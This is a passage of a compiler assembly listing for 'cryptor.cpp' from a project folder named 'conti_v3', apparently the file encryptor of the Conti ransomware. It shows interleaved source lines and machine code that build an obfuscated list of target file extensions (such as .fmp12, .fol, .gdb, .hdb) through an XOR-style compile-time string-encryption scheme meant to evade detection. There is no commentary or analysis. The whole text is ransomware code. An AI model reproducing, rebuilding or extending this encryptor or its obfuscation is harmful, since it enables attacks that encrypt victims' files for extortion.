	00 2f		 mov	 BYTE PTR $T58[rbp-255], 47 ; 0000002fH
  01657	c6 85 c2 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-254], 22
  0165e	c6 85 c3 08 00
	00 5e		 mov	 BYTE PTR $T58[rbp-253], 94 ; 0000005eH
  01665	c6 85 c4 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-252], 22
  0166c	c6 85 c5 08 00
	00 54		 mov	 BYTE PTR $T58[rbp-251], 84 ; 00000054H
  01673	c6 85 c6 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-250], 22
  0167a	c6 85 c7 08 00
	00 74		 mov	 BYTE PTR $T58[rbp-249], 116 ; 00000074H
  01681	c6 85 c8 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-248], 22
  01688	c6 85 c9 08 00
	00 4f		 mov	 BYTE PTR $T58[rbp-247], 79 ; 0000004fH
  0168f	c6 85 ca 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-246], 22
  01696	c6 85 cb 08 00
	00 05		 mov	 BYTE PTR $T58[rbp-245], 5
  0169d	c6 85 cc 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-244], 22
  016a4	c6 85 cd 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-243], 22
  016ab	c6 85 ce 08 00
	00 16		 mov	 BYTE PTR $T58[rbp-242], 22
  016b2	0f b6 85 c1 08
	00 00		 movzx	 eax, BYTE PTR $T58[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 351  : 		OBFW(L".fmp12"),

  016b9	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0BG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<53,22,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  016be	48 89 85 f8 0b
	00 00		 mov	 QWORD PTR Extensions$[rbp+200], rax

; 352  : 		OBFW(L".fmpsl"),

  016c5	48 8d 8d d0 08
	00 00		 lea	 rcx, QWORD PTR $T59[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  016cc	c6 85 d0 08 00
	00 00		 mov	 BYTE PTR $T59[rbp-256], 0
  016d3	c6 85 d1 08 00
	00 6f		 mov	 BYTE PTR $T59[rbp-255], 111 ; 0000006fH
  016da	c6 85 d2 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-254], 3
  016e1	c6 85 d3 08 00
	00 79		 mov	 BYTE PTR $T59[rbp-253], 121 ; 00000079H
  016e8	c6 85 d4 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-252], 3
  016ef	c6 85 d5 08 00
	00 1b		 mov	 BYTE PTR $T59[rbp-251], 27
  016f6	c6 85 d6 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-250], 3
  016fd	c6 85 d7 08 00
	00 17		 mov	 BYTE PTR $T59[rbp-249], 23
  01704	c6 85 d8 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-248], 3
  0170b	c6 85 d9 08 00
	00 13		 mov	 BYTE PTR $T59[rbp-247], 19
  01712	c6 85 da 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-246], 3
  01719	c6 85 db 08 00
	00 71		 mov	 BYTE PTR $T59[rbp-245], 113 ; 00000071H
  01720	c6 85 dc 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-244], 3
  01727	c6 85 dd 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-243], 3
  0172e	c6 85 de 08 00
	00 03		 mov	 BYTE PTR $T59[rbp-242], 3
  01735	0f b6 85 d1 08
	00 00		 movzx	 eax, BYTE PTR $T59[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 352  : 		OBFW(L".fmpsl"),

  0173c	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CJ@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ; MetaBuffer<41,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  01741	48 89 85 00 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+208], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01748	c6 85 00 02 00
	00 00		 mov	 BYTE PTR $T60[rbp-256], 0
  0174f	c6 85 01 02 00
	00 6b		 mov	 BYTE PTR $T60[rbp-255], 107 ; 0000006bH
  01756	c6 85 02 02 00
	00 60		 mov	 BYTE PTR $T60[rbp-254], 96 ; 00000060H
  0175d	c6 85 03 02 00
	00 15		 mov	 BYTE PTR $T60[rbp-253], 21
  01764	c6 85 04 02 00
	00 60		 mov	 BYTE PTR $T60[rbp-252], 96 ; 00000060H
  0176b	c6 85 05 02 00
	00 30		 mov	 BYTE PTR $T60[rbp-251], 48 ; 00000030H
  01772	c6 85 06 02 00
	00 60		 mov	 BYTE PTR $T60[rbp-250], 96 ; 00000060H
  01779	c6 85 07 02 00
	00 27		 mov	 BYTE PTR $T60[rbp-249], 39 ; 00000027H

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01780	c6 85 08 02 00
	00 60		 mov	 BYTE PTR $T60[rbp-248], 96 ; 00000060H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 353  : 		OBFW(L".fol"),

  01787	48 8d 8d 00 02
	00 00		 lea	 rcx, QWORD PTR $T60[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0178e	c6 85 09 02 00
	00 60		 mov	 BYTE PTR $T60[rbp-247], 96 ; 00000060H
  01795	c6 85 0a 02 00
	00 60		 mov	 BYTE PTR $T60[rbp-246], 96 ; 00000060H
  0179c	0f b6 85 01 02
	00 00		 movzx	 eax, BYTE PTR $T60[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 353  : 		OBFW(L".fol"),

  017a3	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$02$0GA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<3,96,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  017a8	48 89 85 08 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+216], rax

; 354  : 		OBFW(L".fp3"),

  017af	48 8d 8d 10 02
	00 00		 lea	 rcx, QWORD PTR $T61[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  017b6	c6 85 10 02 00
	00 00		 mov	 BYTE PTR $T61[rbp-256], 0
  017bd	c6 85 11 02 00
	00 7d		 mov	 BYTE PTR $T61[rbp-255], 125 ; 0000007dH
  017c4	c6 85 12 02 00
	00 5b		 mov	 BYTE PTR $T61[rbp-254], 91 ; 0000005bH
  017cb	c6 85 13 02 00
	00 43		 mov	 BYTE PTR $T61[rbp-253], 67 ; 00000043H
  017d2	c6 85 14 02 00
	00 5b		 mov	 BYTE PTR $T61[rbp-252], 91 ; 0000005bH
  017d9	c6 85 15 02 00
	00 66		 mov	 BYTE PTR $T61[rbp-251], 102 ; 00000066H
  017e0	c6 85 16 02 00
	00 5b		 mov	 BYTE PTR $T61[rbp-250], 91 ; 0000005bH
  017e7	c6 85 17 02 00
	00 4f		 mov	 BYTE PTR $T61[rbp-249], 79 ; 0000004fH
  017ee	c6 85 18 02 00
	00 5b		 mov	 BYTE PTR $T61[rbp-248], 91 ; 0000005bH
  017f5	c6 85 19 02 00
	00 5b		 mov	 BYTE PTR $T61[rbp-247], 91 ; 0000005bH
  017fc	c6 85 1a 02 00
	00 5b		 mov	 BYTE PTR $T61[rbp-246], 91 ; 0000005bH
  01803	0f b6 85 11 02
	00 00		 movzx	 eax, BYTE PTR $T61[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 354  : 		OBFW(L".fp3"),

  0180a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0FL@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,91,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0180f	48 89 85 10 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+224], rax

; 355  : 		OBFW(L".fp4"),

  01816	48 8d 8d 20 02
	00 00		 lea	 rcx, QWORD PTR $T62[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  0181d	c6 85 20 02 00
	00 00		 mov	 BYTE PTR $T62[rbp-256], 0
  01824	c6 85 21 02 00
	00 7e		 mov	 BYTE PTR $T62[rbp-255], 126 ; 0000007eH
  0182b	c6 85 22 02 00
	00 1e		 mov	 BYTE PTR $T62[rbp-254], 30
  01832	c6 85 23 02 00
	00 16		 mov	 BYTE PTR $T62[rbp-253], 22
  01839	c6 85 24 02 00
	00 1e		 mov	 BYTE PTR $T62[rbp-252], 30
  01840	c6 85 25 02 00
	00 4c		 mov	 BYTE PTR $T62[rbp-251], 76 ; 0000004cH
  01847	c6 85 26 02 00
	00 1e		 mov	 BYTE PTR $T62[rbp-250], 30
  0184e	c6 85 27 02 00
	00 06		 mov	 BYTE PTR $T62[rbp-249], 6
  01855	c6 85 28 02 00
	00 1e		 mov	 BYTE PTR $T62[rbp-248], 30
  0185c	c6 85 29 02 00
	00 1e		 mov	 BYTE PTR $T62[rbp-247], 30
  01863	c6 85 2a 02 00
	00 1e		 mov	 BYTE PTR $T62[rbp-246], 30
  0186a	0f b6 85 21 02
	00 00		 movzx	 eax, BYTE PTR $T62[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 355  : 		OBFW(L".fp4"),

  01871	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0GL@$0BO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<107,30,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01876	48 89 85 18 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+232], rax

; 356  : 		OBFW(L".fp5"),

  0187d	48 8d 8d 30 02
	00 00		 lea	 rcx, QWORD PTR $T63[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01884	c6 85 30 02 00
	00 00		 mov	 BYTE PTR $T63[rbp-256], 0
  0188b	c6 85 31 02 00
	00 4f		 mov	 BYTE PTR $T63[rbp-255], 79 ; 0000004fH
  01892	c6 85 32 02 00
	00 51		 mov	 BYTE PTR $T63[rbp-254], 81 ; 00000051H
  01899	c6 85 33 02 00
	00 3c		 mov	 BYTE PTR $T63[rbp-253], 60 ; 0000003cH
  018a0	c6 85 34 02 00
	00 51		 mov	 BYTE PTR $T63[rbp-252], 81 ; 00000051H
  018a7	c6 85 35 02 00
	00 2b		 mov	 BYTE PTR $T63[rbp-251], 43 ; 0000002bH
  018ae	c6 85 36 02 00
	00 51		 mov	 BYTE PTR $T63[rbp-250], 81 ; 00000051H
  018b5	c6 85 37 02 00
	00 1d		 mov	 BYTE PTR $T63[rbp-249], 29
  018bc	c6 85 38 02 00
	00 51		 mov	 BYTE PTR $T63[rbp-248], 81 ; 00000051H
  018c3	c6 85 39 02 00
	00 51		 mov	 BYTE PTR $T63[rbp-247], 81 ; 00000051H
  018ca	c6 85 3a 02 00
	00 51		 mov	 BYTE PTR $T63[rbp-246], 81 ; 00000051H
  018d1	0f b6 85 31 02
	00 00		 movzx	 eax, BYTE PTR $T63[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 356  : 		OBFW(L".fp5"),

  018d8	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0L@$0FB@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<11,81,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  018dd	48 89 85 20 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+240], rax

; 357  : 		OBFW(L".fp7"),

  018e4	48 8d 8d 40 02
	00 00		 lea	 rcx, QWORD PTR $T64[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  018eb	c6 85 40 02 00
	00 00		 mov	 BYTE PTR $T64[rbp-256], 0
  018f2	c6 85 41 02 00
	00 66		 mov	 BYTE PTR $T64[rbp-255], 102 ; 00000066H
  018f9	c6 85 42 02 00
	00 22		 mov	 BYTE PTR $T64[rbp-254], 34 ; 00000022H
  01900	c6 85 43 02 00
	00 71		 mov	 BYTE PTR $T64[rbp-253], 113 ; 00000071H
  01907	c6 85 44 02 00
	00 22		 mov	 BYTE PTR $T64[rbp-252], 34 ; 00000022H
  0190e	c6 85 45 02 00
	00 38		 mov	 BYTE PTR $T64[rbp-251], 56 ; 00000038H
  01915	c6 85 46 02 00
	00 22		 mov	 BYTE PTR $T64[rbp-250], 34 ; 00000022H
  0191c	c6 85 47 02 00
	00 26		 mov	 BYTE PTR $T64[rbp-249], 38 ; 00000026H
  01923	c6 85 48 02 00
	00 22		 mov	 BYTE PTR $T64[rbp-248], 34 ; 00000022H
  0192a	c6 85 49 02 00
	00 22		 mov	 BYTE PTR $T64[rbp-247], 34 ; 00000022H
  01931	c6 85 4a 02 00
	00 22		 mov	 BYTE PTR $T64[rbp-246], 34 ; 00000022H
  01938	0f b6 85 41 02
	00 00		 movzx	 eax, BYTE PTR $T64[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 357  : 		OBFW(L".fp7"),

  0193f	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$06$0CC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<7,34,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01944	48 89 85 28 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+248], rax

; 358  : 		OBFW(L".fpt"),

  0194b	48 8d 8d 50 02
	00 00		 lea	 rcx, QWORD PTR $T65[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01952	c6 85 50 02 00
	00 00		 mov	 BYTE PTR $T65[rbp-256], 0
  01959	c6 85 51 02 00
	00 16		 mov	 BYTE PTR $T65[rbp-255], 22
  01960	c6 85 52 02 00
	00 39		 mov	 BYTE PTR $T65[rbp-254], 57 ; 00000039H
  01967	c6 85 53 02 00
	00 07		 mov	 BYTE PTR $T65[rbp-253], 7
  0196e	c6 85 54 02 00
	00 39		 mov	 BYTE PTR $T65[rbp-252], 57 ; 00000039H
  01975	c6 85 55 02 00
	00 1b		 mov	 BYTE PTR $T65[rbp-251], 27
  0197c	c6 85 56 02 00
	00 39		 mov	 BYTE PTR $T65[rbp-250], 57 ; 00000039H
  01983	c6 85 57 02 00
	00 23		 mov	 BYTE PTR $T65[rbp-249], 35 ; 00000023H
  0198a	c6 85 58 02 00
	00 39		 mov	 BYTE PTR $T65[rbp-248], 57 ; 00000039H
  01991	c6 85 59 02 00
	00 39		 mov	 BYTE PTR $T65[rbp-247], 57 ; 00000039H
  01998	c6 85 5a 02 00
	00 39		 mov	 BYTE PTR $T65[rbp-246], 57 ; 00000039H
  0199f	0f b6 85 51 02
	00 00		 movzx	 eax, BYTE PTR $T65[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 358  : 		OBFW(L".fpt"),

  019a6	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$01$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<2,57,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  019ab	48 89 85 30 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+256], rax

; 359  : 		OBFW(L".frm"),

  019b2	48 8d 8d 60 02
	00 00		 lea	 rcx, QWORD PTR $T66[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  019b9	c6 85 60 02 00
	00 00		 mov	 BYTE PTR $T66[rbp-256], 0
  019c0	c6 85 61 02 00
	00 1e		 mov	 BYTE PTR $T66[rbp-255], 30
  019c7	c6 85 62 02 00
	00 42		 mov	 BYTE PTR $T66[rbp-254], 66 ; 00000042H
  019ce	c6 85 63 02 00
	00 45		 mov	 BYTE PTR $T66[rbp-253], 69 ; 00000045H
  019d5	c6 85 64 02 00
	00 42		 mov	 BYTE PTR $T66[rbp-252], 66 ; 00000042H
  019dc	c6 85 65 02 00
	00 20		 mov	 BYTE PTR $T66[rbp-251], 32 ; 00000020H
  019e3	c6 85 66 02 00
	00 42		 mov	 BYTE PTR $T66[rbp-250], 66 ; 00000042H
  019ea	c6 85 67 02 00
	00 3a		 mov	 BYTE PTR $T66[rbp-249], 58 ; 0000003aH
  019f1	c6 85 68 02 00
	00 42		 mov	 BYTE PTR $T66[rbp-248], 66 ; 00000042H
  019f8	c6 85 69 02 00
	00 42		 mov	 BYTE PTR $T66[rbp-247], 66 ; 00000042H
  019ff	c6 85 6a 02 00
	00 42		 mov	 BYTE PTR $T66[rbp-246], 66 ; 00000042H
  01a06	0f b6 85 61 02
	00 00		 movzx	 eax, BYTE PTR $T66[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 359  : 		OBFW(L".frm"),

  01a0d	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EH@$0EC@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<71,66,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01a12	48 89 85 38 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+264], rax

; 360  : 		OBFW(L".gdb"),

  01a19	48 8d 8d 70 02
	00 00		 lea	 rcx, QWORD PTR $T67[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01a20	c6 85 70 02 00
	00 00		 mov	 BYTE PTR $T67[rbp-256], 0
  01a27	c6 85 71 02 00
	00 7b		 mov	 BYTE PTR $T67[rbp-255], 123 ; 0000007bH
  01a2e	c6 85 72 02 00
	00 67		 mov	 BYTE PTR $T67[rbp-254], 103 ; 00000067H
  01a35	c6 85 73 02 00
	00 4c		 mov	 BYTE PTR $T67[rbp-253], 76 ; 0000004cH
  01a3c	c6 85 74 02 00
	00 67		 mov	 BYTE PTR $T67[rbp-252], 103 ; 00000067H
  01a43	c6 85 75 02 00
	00 19		 mov	 BYTE PTR $T67[rbp-251], 25
  01a4a	c6 85 76 02 00
	00 67		 mov	 BYTE PTR $T67[rbp-250], 103 ; 00000067H
  01a51	c6 85 77 02 00
	00 76		 mov	 BYTE PTR $T67[rbp-249], 118 ; 00000076H
  01a58	c6 85 78 02 00
	00 67		 mov	 BYTE PTR $T67[rbp-248], 103 ; 00000067H
  01a5f	c6 85 79 02 00
	00 67		 mov	 BYTE PTR $T67[rbp-247], 103 ; 00000067H
  01a66	c6 85 7a 02 00
	00 67		 mov	 BYTE PTR $T67[rbp-246], 103 ; 00000067H
  01a6d	0f b6 85 71 02
	00 00		 movzx	 eax, BYTE PTR $T67[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 360  : 		OBFW(L".gdb"),

  01a74	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0BB@$0GH@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<17,103,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01a79	48 89 85 40 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+272], rax

; 361  : 		OBFW(L".grdb"),

  01a80	48 8d 8d e0 07
	00 00		 lea	 rcx, QWORD PTR $T68[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01a87	c6 85 e0 07 00
	00 00		 mov	 BYTE PTR $T68[rbp-256], 0
  01a8e	c6 85 e1 07 00
	00 6d		 mov	 BYTE PTR $T68[rbp-255], 109 ; 0000006dH
  01a95	c6 85 e2 07 00
	00 54		 mov	 BYTE PTR $T68[rbp-254], 84 ; 00000054H
  01a9c	c6 85 e3 07 00
	00 52		 mov	 BYTE PTR $T68[rbp-253], 82 ; 00000052H
  01aa3	c6 85 e4 07 00
	00 54		 mov	 BYTE PTR $T68[rbp-252], 84 ; 00000054H
  01aaa	c6 85 e5 07 00
	00 1e		 mov	 BYTE PTR $T68[rbp-251], 30
  01ab1	c6 85 e6 07 00
	00 54		 mov	 BYTE PTR $T68[rbp-250], 84 ; 00000054H
  01ab8	c6 85 e7 07 00
	00 32		 mov	 BYTE PTR $T68[rbp-249], 50 ; 00000032H
  01abf	c6 85 e8 07 00
	00 54		 mov	 BYTE PTR $T68[rbp-248], 84 ; 00000054H
  01ac6	c6 85 e9 07 00
	00 47		 mov	 BYTE PTR $T68[rbp-247], 71 ; 00000047H
  01acd	c6 85 ea 07 00
	00 54		 mov	 BYTE PTR $T68[rbp-246], 84 ; 00000054H
  01ad4	c6 85 eb 07 00
	00 54		 mov	 BYTE PTR $T68[rbp-245], 84 ; 00000054H
  01adb	c6 85 ec 07 00
	00 54		 mov	 BYTE PTR $T68[rbp-244], 84 ; 00000054H
  01ae2	0f b6 85 e1 07
	00 00		 movzx	 eax, BYTE PTR $T68[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 361  : 		OBFW(L".grdb"),

  01ae9	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DF@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ; MetaBuffer<53,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
  01aee	48 89 85 48 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+280], rax

; 362  : 		OBFW(L".gwi"),

  01af5	48 8d 8d 80 02
	00 00		 lea	 rcx, QWORD PTR $T69[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01afc	c6 85 80 02 00
	00 00		 mov	 BYTE PTR $T69[rbp-256], 0
  01b03	c6 85 81 02 00
	00 3b		 mov	 BYTE PTR $T69[rbp-255], 59 ; 0000003bH
  01b0a	c6 85 82 02 00
	00 33		 mov	 BYTE PTR $T69[rbp-254], 51 ; 00000033H
  01b11	c6 85 83 02 00
	00 5b		 mov	 BYTE PTR $T69[rbp-253], 91 ; 0000005bH
  01b18	c6 85 84 02 00
	00 33		 mov	 BYTE PTR $T69[rbp-252], 51 ; 00000033H
  01b1f	c6 85 85 02 00
	00 16		 mov	 BYTE PTR $T69[rbp-251], 22
  01b26	c6 85 86 02 00
	00 33		 mov	 BYTE PTR $T69[rbp-250], 51 ; 00000033H
  01b2d	c6 85 87 02 00
	00 03		 mov	 BYTE PTR $T69[rbp-249], 3
  01b34	c6 85 88 02 00
	00 33		 mov	 BYTE PTR $T69[rbp-248], 51 ; 00000033H
  01b3b	c6 85 89 02 00
	00 33		 mov	 BYTE PTR $T69[rbp-247], 51 ; 00000033H
  01b42	c6 85 8a 02 00
	00 33		 mov	 BYTE PTR $T69[rbp-246], 51 ; 00000033H
  01b49	0f b6 85 81 02
	00 00		 movzx	 eax, BYTE PTR $T69[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 362  : 		OBFW(L".gwi"),

  01b50	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0FD@$0DD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<83,51,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01b55	48 89 85 50 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+288], rax

; 363  : 		OBFW(L".hdb"),

  01b5c	48 8d 8d 90 02
	00 00		 lea	 rcx, QWORD PTR $T70[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01b63	c6 85 90 02 00
	00 00		 mov	 BYTE PTR $T70[rbp-256], 0
  01b6a	c6 85 91 02 00
	00 7c		 mov	 BYTE PTR $T70[rbp-255], 124 ; 0000007cH
  01b71	c6 85 92 02 00
	00 2e		 mov	 BYTE PTR $T70[rbp-254], 46 ; 0000002eH
  01b78	c6 85 93 02 00
	00 07		 mov	 BYTE PTR $T70[rbp-253], 7
  01b7f	c6 85 94 02 00
	00 2e		 mov	 BYTE PTR $T70[rbp-252], 46 ; 0000002eH
  01b86	c6 85 95 02 00
	00 48		 mov	 BYTE PTR $T70[rbp-251], 72 ; 00000048H
  01b8d	c6 85 96 02 00
	00 2e		 mov	 BYTE PTR $T70[rbp-250], 46 ; 0000002eH
  01b94	c6 85 97 02 00
	00 29		 mov	 BYTE PTR $T70[rbp-249], 41 ; 00000029H
  01b9b	c6 85 98 02 00
	00 2e		 mov	 BYTE PTR $T70[rbp-248], 46 ; 0000002eH
  01ba2	c6 85 99 02 00
	00 2e		 mov	 BYTE PTR $T70[rbp-247], 46 ; 0000002eH
  01ba9	c6 85 9a 02 00
	00 2e		 mov	 BYTE PTR $T70[rbp-246], 46 ; 0000002eH
  01bb0	0f b6 85 91 02
	00 00		 movzx	 eax, BYTE PTR $T70[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 363  : 		OBFW(L".hdb"),

  01bb7	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0EP@$0CO@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<79,46,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01bbc	48 89 85 58 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+296], rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01bc3	c6 85 a0 02 00
	00 00		 mov	 BYTE PTR $T71[rbp-256], 0
  01bca	c6 85 a1 02 00
	00 12		 mov	 BYTE PTR $T71[rbp-255], 18
  01bd1	c6 85 a2 02 00
	00 6f		 mov	 BYTE PTR $T71[rbp-254], 111 ; 0000006fH

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01bd8	c6 85 a3 02 00
	00 5e		 mov	 BYTE PTR $T71[rbp-253], 94 ; 0000005eH
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 364  : 		OBFW(L".his"),

  01bdf	48 8d 8d a0 02
	00 00		 lea	 rcx, QWORD PTR $T71[rbp-256]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  01be6	c6 85 a4 02 00
	00 6f		 mov	 BYTE PTR $T71[rbp-252], 111 ; 0000006fH
  01bed	c6 85 a5 02 00
	00 22		 mov	 BYTE PTR $T71[rbp-251], 34 ; 00000022H
  01bf4	c6 85 a6 02 00
	00 6f		 mov	 BYTE PTR $T71[rbp-250], 111 ; 0000006fH
  01bfb	c6 85 a7 02 00
	00 45		 mov	 BYTE PTR $T71[rbp-249], 69 ; 00000045H
  01c02	c6 85 a8 02 00
	00 6f		 mov	 BYTE PTR $T71[rbp-248], 111 ; 0000006fH
  01c09	c6 85 a9 02 00
	00 6f		 mov	 BYTE PTR $T71[rbp-247], 111 ; 0000006fH
  01c10	c6 85 aa 02 00
	00 6f		 mov	 BYTE PTR $T71[rbp-246], 111 ; 0000006fH
  01c17	0f b6 85 a1 02
	00 00		 movzx	 eax, BYTE PTR $T71[rbp-255]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 364  : 		OBFW(L".his"),

  01c1e	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0ED@$0GP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ; MetaBuffer<67,111,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  01c23	48 89 85 60 0c
	00 00		 mov	 QWORD PTR Extensions$[rbp+304], rax

; 365  : 		OBFW(L".ib"),

  01c2a	48 8d 4c 24 30	 lea	 rcx, QWORD PTR $T72[rsp]
